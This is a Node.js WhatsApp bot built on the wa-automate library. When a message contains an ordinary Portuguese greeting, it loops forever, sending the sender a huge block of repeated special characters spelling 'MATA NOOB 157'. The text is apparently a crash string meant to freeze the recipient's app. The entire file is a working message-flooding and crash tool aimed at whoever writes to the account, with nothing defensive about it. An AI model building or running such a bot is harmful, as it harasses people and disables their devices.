require("dotenv").config();

const wa = require("@open-wa/wa-automate");
wa.create().then((client) => start(client));

 
function contains(target, pattern) {
  var value = 0;
  pattern.forEach(function (word) {
    value = value + target.includes(word);
  });
  return value === 1;
}

const wordList = [
  "Eae",
  "Iae",
  "oi",
  "Oi",
  "Ta ai",
  "slv",
  "Slv",
  "Ola",
  "olá",
  "ola",
  "Olá",
];

function start(client) {
  client.onMessage(async (message) => {
    if (contains(message.body, wordList)) {
      console.log("Spamando....");

      while (true) {
        await client.sendText(
          message.from,
          `漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.漢.࿊.M.A.T.A.漢
          `
        );
      }
    } else if (message.body === "Trava") {
      await client.kill();
      wa.create().then((client) => start(client));
    }
  });
}
